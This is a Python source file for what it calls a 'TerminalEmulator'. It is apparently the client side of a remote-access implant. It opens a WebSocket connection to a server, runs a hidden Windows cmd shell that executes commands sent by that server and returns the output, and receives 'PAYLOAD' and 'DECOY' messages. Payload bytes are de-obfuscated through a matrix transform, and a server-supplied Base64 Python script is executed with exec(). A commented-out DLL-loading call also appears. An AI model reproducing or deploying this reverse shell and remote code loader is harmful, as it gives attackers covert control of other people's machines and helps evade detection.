import asyncio
import base64
import json
import logging
import subprocess
import sys
import threading

import numpy as np
from PyQt6.QtCore import QThread, pyqtSignal

from .transformer import ByteImageTransformer
# Assuming WebSocketClient is correctly implemented to handle async operations
from .web_socket_client import WebSocketClient

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(filename)s - %(funcName)s - %(lineno)d - %(message)s",
)


class TerminalEmulator(QThread):
    command_output = pyqtSignal(str)

    def __init__(self, server_address):
        super().__init__()
        logging.debug("Initializing TerminalEmulator")
        self.server_address = server_address
        self.process = None
        self.running = True
        self.command_queue = []  # Queue for commands to be executed

        # Initialize WebSocket client and connect signals
        self.ws_client = WebSocketClient(server_address)
        self.ws_client.messageReceived.connect(self.on_message_received)
        self.ws_client.messageReceivedBytes.connect(self.on_message_received)
        self.receiving_file = False
        self.receiving_payload = False
        self.key = 100
        self.filename = 0
        self.filesize = 0
        self.received_filesize = 0
        self.expected_filesize = 0
        self.transform_matrix = np.array([[1, 1], [0, 1]])
        self.inverse_matrix = np.linalg.inv(self.transform_matrix)
        self.reversed_values = None
        self.receiving_decoy = None
        self.transformer = ByteImageTransformer()

    def on_message_received(self, message):
        # Assuming `message` can be either a str (for commands) or bytes (for file data).
        # This requires distinguishing between text and binary data.
        if isinstance(message, str) and message.startswith("FILE:"):
            logging.debug("Receiving file")
            _, self.filename, self.filesize = message.split(":", 2)
            logging.debug(f"The self.filesize is {self.filesize}")
            self.file = open(
                self.filename, "wb"
            )  # Open a new file to write binary data
            logging.debug(f"Opening file to write to: {self.filename}")
            self.receiving_file = True
            self.expected_filesize = int(self.filesize)
            self.received_filesize = 0
        elif isinstance(message, str) and message.startswith("PAYLOAD:"):
            self.receiving_payload = True
            _, self.filename, self.filesize = message.split(":", 2)
        elif isinstance(message, str) and message.startswith("DECOY:"):
            self.receiving_decoy = True
            _, self.filename, self.filesize = message.split(":", 2)
        elif self.receiving_file and isinstance(message, bytes):
            # Assuming `message` is binary data for the file
            self.file.write(message)
            self.received_filesize += len(message)
            logging.debug(
                f"Received {self.received_filesize}/{self.expected_filesize} bytes"
            )
            if self.received_filesize >= self.expected_filesize:
                # Close the file when transfer is complete
                self.file.close()
                logging.debug(f"File received successfully: {self.file.name}")
                self.receiving_file = False
                # Use `command_output` appropriately here
                self.command_output.emit(
                    f"File received successfully: {self.file.name}"
                )
                # If it's a method: self.command_output(f"File received successfully: {self.file.name}")

        # Assuming this is part of a class definition...
        elif self.receiving_decoy:
            # Decode the Base64 encoded Python script
            decoded_code = base64.b64decode(message).decode()

            try:
                if self.reversed_values:
                    # Prepare the execution environment with necessary variables
                    execution_environment = {
                        "hex_data_json": json.dumps(self.reversed_values)
                    }
                    print(json.dumps(self.reversed_values))
                    # Execute the decoded Python script with exec(), providing the execution environment
                    exec(decoded_code, execution_environment)

                    print("Script executed successfully")
                    self.command_output.emit("Script executed successfully")

            except (
                Exception
            ) as e:  # Catching general exceptions for demonstration; refine as needed.
                error_message = f"Script execution failed. Error: {str(e)}"
                logging.error(error_message)
                print(
                    error_message, file=sys.stderr
                )  # Ensure sys.stderr is imported or adjust as necessary.
                self.command_output.emit(error_message)

            self.receiving_decoy = False

        elif self.receiving_payload and isinstance(message, bytes):
            self.payload_buffer = bytearray()
            self.payload_buffer.extend(message)
            self.received_filesize += len(message)

            if self.received_filesize >= self.expected_filesize:
                logging.debug("Payload fully received, starting reversal process.")

                # Convert the payload buffer directly to a list of integers
                transformed_values = [b for b in self.payload_buffer]

                # Reverse transform the received values
                self.reversed_values = self.transformer.reverse_transform_hex_values(
                    transformed_values
                )

                # Convert reversed hex strings back to bytes
                reversed_bytes = bytes([int(val, 16) for val in self.reversed_values])

                # For logging or further processing, if needed
                logging.info(f"Reversed values: {' '.join(self.reversed_values)}")
                reversed_bytes_str = " ".join(
                    [f"{byte:02x}" for byte in reversed_bytes]
                )
                logging.info(f"Reversed bytes: {reversed_bytes_str}")

                # load_and_execute_dlls(reversed_values)

                # Reset for next file, if applicable
                self.received_filesize = 0
                self.expected_filesize = 0
                self.payload_buffer.clear()

        else:
            self.command_output.emit(message)
            self.write(message)

    def run(self):
        logging.debug("Starting TerminalEmulator thread")
        # Start the WebSocket client in its own thread.
        self.ws_client.start()

        while self.running:
            if not self.process:
                self.start_new_process()

            if self.command_queue:
                command = self.command_queue.pop(0)
                self.execute_command(command)

            # Sleep to reduce CPU usage
            self.msleep(100)

    def start_new_process(self):
        logging.debug("Starting new subprocess for the terminal")
        # Start a subprocess for the terminal
        self.process = subprocess.Popen(
            ["cmd"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        threading.Thread(target=self.read_output, daemon=True).start()

    def execute_command(self, command: str):
        logging.debug(f"Executing command: {command}")
        # Execute a command in the subprocess
        if self.process:
            self.process.stdin.write(command + "\n")
            self.process.stdin.flush()

    def read_output(self):
        logging.debug("Starting to read output from subprocess")
        # Read output from the subprocess and handle it
        while self.running and self.process:
            output = self.process.stdout.readline()
            if output:
                logging.debug(f"Subprocess output: {output.strip()}")
                # Use signal to update GUI and send output to server
                self.command_output.emit(output.strip())
                # Schedule send_message on the ws_client's event loop
                if self.ws_client.loop:
                    asyncio.run_coroutine_threadsafe(
                        self.ws_client.send_message(output.strip()), self.ws_client.loop
                    )

    def write(self, command: str):
        logging.debug(f"Adding command to queue: {command}")
        # Add a command to the queue
        self.command_queue.append(command)

    def stop(self):
        logging.debug("Stopping TerminalEmulator")
        # Stop the thread, subprocess, and WebSocket client
        self.running = False
        if self.process:
            self.process.terminate()
        self.ws_client.stop()
